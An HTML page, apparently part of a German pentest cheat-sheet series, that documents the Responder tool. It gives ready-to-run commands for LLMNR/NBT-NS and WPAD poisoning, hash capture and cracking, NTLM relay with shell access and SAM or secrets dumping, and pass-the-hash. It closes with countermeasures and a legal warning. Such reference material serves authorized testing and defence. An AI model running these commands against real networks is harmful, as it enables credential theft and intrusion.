@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Responder - TheLayer0Guide</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Syne:wght@400;600;800&display=swap" rel="stylesheet">
+<link rel="icon" type="image/svg+xml" href="../assets/responder.svg">
+<style>
+  :root{--bg:#0d1117;--surface:#161b22;--border:#30363d;--accent:#be185d;--accent2:#f472b6;--green:#3fb950;--purple:#a371f7;--cyan:#39c5cf;--red:#f47067;--text:#e6edf3;--muted:#7d8590;--code-bg:#10161d;}
+  *{margin:0;padding:0;box-sizing:border-box;}
+  body{background:var(--bg);color:var(--text);font-family:'Syne',sans-serif;min-height:100vh;}
+  header{background:linear-gradient(135deg,#0d1117 0%,#1a0010 50%,#0d1117 100%);border-bottom:2px solid var(--accent);padding:40px 48px 32px;position:relative;overflow:hidden;}
+  header::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse 600px 200px at 60% 50%,rgba(190,24,93,.08),transparent);}
+  .header-grid{display:grid;grid-template-columns:1fr auto;align-items:end;gap:24px;position:relative;}
+  .badge{display:inline-block;font-family:'JetBrains Mono',monospace;font-size:10px;font-weight:600;color:var(--accent);background:rgba(190,24,93,.1);border:1px solid rgba(190,24,93,.3);padding:3px 10px;border-radius:3px;letter-spacing:2px;text-transform:uppercase;margin-bottom:12px;}
+  h1{font-size:clamp(28px,4vw,48px);font-weight:800;letter-spacing:-1px;line-height:1.1;color:var(--text);}
+  h1 span{color:var(--accent);}
+  .subtitle{color:var(--muted);font-size:14px;margin-top:8px;font-family:'JetBrains Mono',monospace;}
+  .meta{text-align:right;font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--muted);line-height:1.8;}
+  .meta strong{color:var(--accent2);}
+  .version-legend{margin-top:18px;display:flex;gap:10px;flex-wrap:wrap;}
+  .chip{font-family:'JetBrains Mono',monospace;font-size:11px;border-radius:4px;padding:4px 12px;font-weight:600;}
+  .ch-re{background:rgba(190,24,93,.1);border:1px solid rgba(190,24,93,.3);color:var(--accent);}
+  .ch-gn{background:rgba(63,185,80,.1);border:1px solid rgba(63,185,80,.3);color:var(--green);}
+  .ch-cy{background:rgba(57,197,207,.1);border:1px solid rgba(57,197,207,.3);color:var(--cyan);}
+  .ch-pu{background:rgba(163,113,247,.1);border:1px solid rgba(163,113,247,.3);color:var(--purple);}
+  main{padding:32px 48px;max-width:1400px;margin:0 auto;columns:3;column-gap:20px;}
+  .section{break-inside:avoid;margin-bottom:20px;background:var(--surface);border:1px solid var(--border);border-radius:8px;overflow:hidden;}
+  .section-header{display:flex;align-items:center;gap:10px;padding:12px 16px;border-bottom:1px solid var(--border);}
+  .section-icon{width:28px;height:28px;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0;}
+  .section-title{font-size:13px;font-weight:600;letter-spacing:.5px;text-transform:uppercase;}
+  .th-re .section-header{background:rgba(190,24,93,.06);} .th-re .section-icon{background:rgba(190,24,93,.15);} .th-re .section-title{color:var(--accent);}
+  .th-gn .section-header{background:rgba(63,185,80,.06);} .th-gn .section-icon{background:rgba(63,185,80,.15);} .th-gn .section-title{color:var(--green);}
+  .th-cy .section-header{background:rgba(57,197,207,.06);} .th-cy .section-icon{background:rgba(57,197,207,.15);} .th-cy .section-title{color:var(--cyan);}
+  .th-pu .section-header{background:rgba(163,113,247,.06);} .th-pu .section-icon{background:rgba(163,113,247,.15);} .th-pu .section-title{color:var(--purple);}
+  .th-bl .section-header{background:rgba(37,99,235,.06);} .th-bl .section-icon{background:rgba(37,99,235,.15);} .th-bl .section-title{color:#60a5fa;}
+  .th-or .section-header{background:rgba(249,115,22,.06);} .th-or .section-icon{background:rgba(249,115,22,.15);} .th-or .section-title{color:#fb923c;}
+  .command-list{padding:8px 0;}
+  .cmd-entry{padding:6px 16px;border-bottom:1px solid rgba(48,54,61,.5);}
+  .cmd-entry:last-child{border-bottom:none;}
+  .cmd-desc{font-size:10px;color:var(--muted);margin-bottom:3px;letter-spacing:.3px;text-transform:uppercase;}
+  code{font-family:'JetBrains Mono',monospace;font-size:11.5px;color:var(--text);background:var(--code-bg);display:block;padding:5px 9px;border-radius:4px;line-height:1.6;white-space:pre-wrap;word-break:break-all;}
+  .kw{color:#f472b6;font-weight:700;} .st{color:#3fb950;} .nu{color:#f47067;}
+  .cm{color:#7d8590;font-style:italic;} .fn{color:#39c5cf;font-weight:600;}
+  .tip{padding:8px 16px;background:rgba(190,24,93,.06);border-left:3px solid var(--accent);font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--muted);line-height:1.6;}
+  .tip strong{color:var(--text);}
+  .nav-link{position:absolute;top:40px;right:48px;z-index:10;font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--accent);text-decoration:none;border:1px solid rgba(190,24,93,.3);padding:4px 12px;border-radius:4px;background:rgba(190,24,93,.08);}
+  .nav-link:hover{background:rgba(190,24,93,.15);}
+  @media(max-width:1100px){main{columns:2;}}
+  @media(max-width:700px){main{columns:1;padding:16px;}header{padding:24px 16px;}}
+</style>
+</head>
+<body>
+<header>
+  <a href="../index.html" class="nav-link">← Index</a>
+  <div class="header-grid">
+    <div>
+      <div class="badge">▸ Security · Active Directory · Credential Capture</div>
+      <img src="../assets/responder.svg" alt="Logo" style="width:48px;height:48px;margin-bottom:12px;display:block;filter:brightness(0) invert(1)">
+      <h1><span>Responder</span><br>TheLayer<span style="color:#a371f7;font-family:'JetBrains Mono',monospace;font-size:1.25em;-webkit-text-fill-color:#a371f7;">0</span>Guide</h1>
+      <p class="subtitle">$ responder -I eth0 -rdwP</p>
+      <div class="version-legend">
+        <div class="chip ch-re">LLMNR/NBT-NS</div>
+        <div class="chip ch-gn">NTLMv2 Hashes</div>
+        <div class="chip ch-cy">NTLM Relay</div>
+        <div class="chip ch-pu">Active Directory</div>
+      </div>
+    </div>
+    <div class="meta"><strong>Responder</strong><br>LLMNR · NBT-NS · MDNS<br>SMB · HTTP · WPAD<br>Credential Capture · Relay</div>
+  </div>
+</header>
+<main>
+
+<!-- 1. Grundlagen & Start -->
+<div class="section th-re">
+  <div class="section-header"><div class="section-icon">📡</div><div class="section-title">Grundlagen &amp; Start</div></div>
+  <div class="command-list">
+    <div class="cmd-entry">
+      <div class="cmd-desc">Vollständiger Start (empfohlen)</div>
+      <code>responder -I eth0 -rdwP</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Minimaler Start</div>
+      <code>responder -I eth0</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Interface angeben</div>
+      <code>responder -I eth0   <span class="cm"># Netzwerk-Interface</span>
+responder -I ens33  <span class="cm"># VMware-Interface</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Wichtige Flags</div>
+      <code><span class="kw">-r</span>   <span class="cm"># NBNS-Antworten aktivieren</span>
+<span class="kw">-d</span>   <span class="cm"># DHCP-Poisoning (Broadcast)</span>
+<span class="kw">-w</span>   <span class="cm"># WPAD-Proxy starten</span>
+<span class="kw">-P</span>   <span class="cm"># ProxyAuth-Mode (Basic Auth)</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Analyze-Mode (nur lauschen)</div>
+      <code>responder -I eth0 -A</code>
+    </div>
+    <div class="tip"><strong>Hinweis:</strong> Responder muss als <strong>root</strong> laufen. Im Analyze-Mode (<strong>-A</strong>) werden keine Antworten gesendet — ideal zur sicheren Aufklärung.</div>
+  </div>
+</div>
+
+<!-- 2. Protokoll-Optionen -->
+<div class="section th-bl">
+  <div class="section-header"><div class="section-icon">⚙️</div><div class="section-title">Protokoll-Optionen</div></div>
+  <div class="command-list">
+    <div class="cmd-entry">
+      <div class="cmd-desc">LM-Hashes anfordern (ältere Windows)</div>
+      <code>responder -I eth0 --lm</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Extended Session Security deaktivieren</div>
+      <code>responder -I eth0 --disable-ess</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Weitere Protokoll-Flags</div>
+      <code><span class="kw">-v</span>            <span class="cm"># verbose Ausgabe</span>
+<span class="kw">-F</span>            <span class="cm"># WPAD-Force-Auth</span>
+<span class="kw">-b</span>            <span class="cm"># Basic HTTP-Auth (kein NTLM)</span>
+<span class="kw">-D</span>            <span class="cm"># DHCP-DNS-Injection</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">WPAD auf alternativen Port</div>
+      <code>responder -I eth0 -w --wpad-port 8080</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Kombinierter Angriff</div>
+      <code>responder -I eth0 -rdwFP --lm</code>
+    </div>
+    <div class="tip"><strong>--disable-ess</strong> deaktiviert Extended Session Security — erhöht Kompatibilität mit älteren Clients, kann aber die Sicherheit von Hashes reduzieren.</div>
+  </div>
+</div>
+
+<!-- 3. Captured Hashes -->
+<div class="section th-cy">
+  <div class="section-header"><div class="section-icon">🔑</div><div class="section-title">Captured Hashes</div></div>
+  <div class="command-list">
+    <div class="cmd-entry">
+      <div class="cmd-desc">Log-Verzeichnis</div>
+      <code>/usr/share/responder/logs/</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Dateiformat der Logs</div>
+      <code>SMB-NTLMv2-SSP-192.168.1.50.txt
+HTTP-NTLMv2-192.168.1.50.txt</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Alle Logs anzeigen / live verfolgen</div>
+      <code>ls /usr/share/responder/logs/
+tail -f /usr/share/responder/logs/*.txt</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">NTLMv2-Hash-Format</div>
+      <code><span class="cm"># user::DOMAIN:challenge:hash:clientchallenge</span>
+jdoe::CORP:1122334455667788:aabbcc...:</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Hashes mit hashcat cracken</div>
+      <code>hashcat -m 5600 hashes.txt rockyou.txt</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Hashes mit john cracken</div>
+      <code>john --format=netntlmv2 hashes.txt \
+  --wordlist=/usr/share/wordlists/rockyou.txt</code>
+    </div>
+    <div class="tip"><strong>Hashcat -m 5600</strong> ist für NTLMv2 (NetNTLMv2). Für NTLMv1 gilt <strong>-m 5500</strong>. Das richtige Format prüfen, bevor der Crack gestartet wird.</div>
+  </div>
+</div>
+
+<!-- 4. Konfiguration -->
+<div class="section th-gn">
+  <div class="section-header"><div class="section-icon">📄</div><div class="section-title">Konfiguration</div></div>
+  <div class="command-list">
+    <div class="cmd-entry">
+      <div class="cmd-desc">Config-Datei</div>
+      <code>/etc/responder/Responder.conf</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Protokolle aktivieren / deaktivieren</div>
+      <code>SMB = On
+HTTP = On
+HTTPS = On
+FTP = On
+LDAP = On</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Auf spezifische IP antworten</div>
+      <code>RespondTo = 192.168.1.100</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">IP aus Antworten ausschließen</div>
+      <code>DontRespondTo = 192.168.1.1</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Festes NTLM-Challenge setzen</div>
+      <code>Challenge = 1122334455667788</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Session-Logging aktivieren</div>
+      <code>SessionLog = On</code>
+    </div>
+    <div class="tip"><strong>Challenge</strong> auf einen festen Wert setzen ermöglicht Rainbow-Table-Angriffe auf NTLMv1 — bei NTLMv2 hat das keinen praktischen Vorteil.</div>
+  </div>
+</div>
+
+<!-- 5. NTLM-Relay mit ntlmrelayx -->
+<div class="section th-or">
+  <div class="section-header"><div class="section-icon">🔀</div><div class="section-title">NTLM-Relay mit ntlmrelayx</div></div>
+  <div class="command-list">
+    <div class="cmd-entry">
+      <div class="cmd-desc">Voraussetzung prüfen (SMB Signing)</div>
+      <code>nmap --script smb2-security-mode \
+  -p 445 192.168.1.0/24</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Responder ohne eigene SMB/HTTP-Server</div>
+      <code>responder -I eth0 \
+  --no-http-server --no-smb-server</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">ntlmrelayx auf Ziel (parallel)</div>
+      <code>ntlmrelayx.py -smb2support \
+  -t smb://192.168.1.100</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Befehl auf Ziel ausführen</div>
+      <code>ntlmrelayx.py -smb2support \
+  -t smb://192.168.1.100 \
+  -c "whoami"</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Interaktive Shell öffnen</div>
+      <code>ntlmrelayx.py -smb2support \
+  -t smb://192.168.1.100 --interactive</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">SAM-Datenbank dumpen</div>
+      <code>ntlmrelayx.py -smb2support \
+  -t smb://192.168.1.100 --sam</code>
+    </div>
+    <div class="tip"><strong>Voraussetzung:</strong> SMB Signing muss auf dem Ziel deaktiviert sein. Responder und ntlmrelayx laufen gleichzeitig in separaten Terminals.</div>
+  </div>
+</div>
+
+<!-- 6. WPAD-Angriff -->
+<div class="section th-pu">
+  <div class="section-header"><div class="section-icon">🌐</div><div class="section-title">WPAD-Angriff</div></div>
+  <div class="command-list">
+    <div class="cmd-entry">
+      <div class="cmd-desc">WPAD-Server aktivieren</div>
+      <code>responder -I eth0 -w</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Force-Auth für alle Browser</div>
+      <code>responder -I eth0 -wF</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">ProxyAuth erzwingen (NTLM-Hashes)</div>
+      <code>responder -I eth0 -wFP</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Automatisch gelieferte Datei</div>
+      <code><span class="cm"># wpad.dat wird von Responder</span>
+<span class="cm"># automatisch ausgeliefert</span>
+<span class="cm"># Browser fragt nach Proxy-Auth</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Wirkungsweise</div>
+      <code><span class="cm"># 1. Browser sucht WPAD via LLMNR/NBT-NS</span>
+<span class="cm"># 2. Responder antwortet mit eigenem wpad.dat</span>
+<span class="cm"># 3. -F zwingt zur Authentifizierung</span>
+<span class="cm"># 4. -P → NTLM-Hash wird übertragen</span></code>
+    </div>
+    <div class="tip"><strong>WPAD-Angriff</strong> ist besonders effektiv in Unternehmensnetzwerken ohne zentrale WPAD-Konfiguration. Fast jeder Browser unterstützt automatische Proxy-Erkennung.</div>
+  </div>
+</div>
+
+<!-- 7. MultiRelay & Pivot -->
+<div class="section th-re">
+  <div class="section-header"><div class="section-icon">🔗</div><div class="section-title">MultiRelay &amp; Pivot</div></div>
+  <div class="command-list">
+    <div class="cmd-entry">
+      <div class="cmd-desc">MultiRelay (Responder-Paket, älter)</div>
+      <code>MultiRelay.py -t 192.168.1.100 -u ALL</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Interaktive Shell via ntlmrelayx</div>
+      <code>ntlmrelayx.py --smb2support \
+  -t smb://192.168.1.100 --interactive</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Auf offene Shell verbinden (smbclient)</div>
+      <code>smbclient //127.0.0.1/C$ \
+  -U '' -N -p 11000</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Pass-the-Hash nach Relay</div>
+      <code><span class="cm"># NTLM-Hash aus SAM-Dump verwenden:</span>
+impacket-psexec -hashes :HASH \
+  Administrator@192.168.1.100</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Secretsdump via Relay</div>
+      <code>ntlmrelayx.py -smb2support \
+  -t 192.168.1.100 \
+  -e secretsdump.py</code>
+    </div>
+    <div class="tip"><strong>Pass-the-Hash</strong> folgt häufig nach einem erfolgreichen NTLM-Relay. NTLM-Hashes aus dem SAM-Dump können direkt für laterale Bewegung genutzt werden.</div>
+  </div>
+</div>
+
+<!-- 8. Erkennung & Gegenmaßnahmen -->
+<div class="section th-bl">
+  <div class="section-header"><div class="section-icon">🛡️</div><div class="section-title">Erkennung &amp; Gegenmaßnahmen</div></div>
+  <div class="command-list">
+    <div class="cmd-entry">
+      <div class="cmd-desc">SMB Signing erzwingen (PowerShell)</div>
+      <code>Set-SmbServerConfiguration \
+  -RequireSecuritySignature $true</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">LLMNR deaktivieren (GPO)</div>
+      <code><span class="cm"># Gruppenrichtlinie:</span>
+<span class="cm"># Computer Config → Admin Templates</span>
+<span class="cm"># → Network → DNS Client</span>
+<span class="cm"># → "Turn off Multicast Name Resolution"</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">NBT-NS deaktivieren (Registry)</div>
+      <code><span class="cm"># HKLM\SYSTEM\CurrentControlSet\</span>
+<span class="cm"># Services\NetBT\Parameters\Interfaces</span>
+<span class="cm"># → NetbiosOptions = 2</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">WPAD deaktivieren</div>
+      <code><span class="cm"># Winhttp → WpadAutoDetect = 0</span>
+<span class="cm"># oder via GPO: Disable WPAD</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Erkennung via Netzwerk-IDS</div>
+      <code><span class="cm"># Anomalie-Muster:</span>
+<span class="cm"># - Broadcast-Antworten auf LLMNR</span>
+<span class="cm"># - Unbekannte NBNS-Responder</span>
+<span class="cm"># - WPAD-Anfragen an interne Hosts</span></code>
+    </div>
+    <div class="tip"><strong>Wichtigste Maßnahme:</strong> SMB Signing und Deaktivierung von LLMNR/NBT-NS im gesamten Netz. Diese drei Maßnahmen zusammen machen Responder-Angriffe weitgehend unwirksam.</div>
+  </div>
+</div>
+
+<!-- 9. Quick Reference -->
+<div class="section th-cy">
+  <div class="section-header"><div class="section-icon">⚡</div><div class="section-title">Quick Reference</div></div>
+  <div class="command-list">
+    <div class="cmd-entry">
+      <div class="cmd-desc">Standard-Pentest-Befehl</div>
+      <code>responder -I eth0 -rdwP</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Nur lauschen (kein Poisoning)</div>
+      <code>responder -I eth0 -A</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Alle gesammelten Hashes cracken</div>
+      <code>hashcat -m 5600 \
+  /usr/share/responder/logs/*.txt \
+  /usr/share/wordlists/rockyou.txt</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Relay-Setup (zwei Terminals)</div>
+      <code><span class="cm"># Terminal 1 — Responder:</span>
+responder -I eth0 \
+  --no-http-server --no-smb-server
+<span class="cm"># Terminal 2 — Relay:</span>
+ntlmrelayx.py -smb2support \
+  -t smb://ZIEL --sam</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Hash-Typ für hashcat</div>
+      <code><span class="cm"># NTLMv2 (NetNTLMv2): -m 5600</span>
+<span class="cm"># NTLMv1 (NetNTLM):   -m 5500</span>
+<span class="cm"># NTHash (NTLM):      -m 1000</span></code>
+    </div>
+    <div class="tip"><strong>Wichtig:</strong> Responder nur in autorisierten Umgebungen einsetzen. Der Einsatz in produktiven Netzwerken ohne Genehmigung ist illegal.</div>
+  </div>
+</div>
+
+</main>
+</body>
+</html>
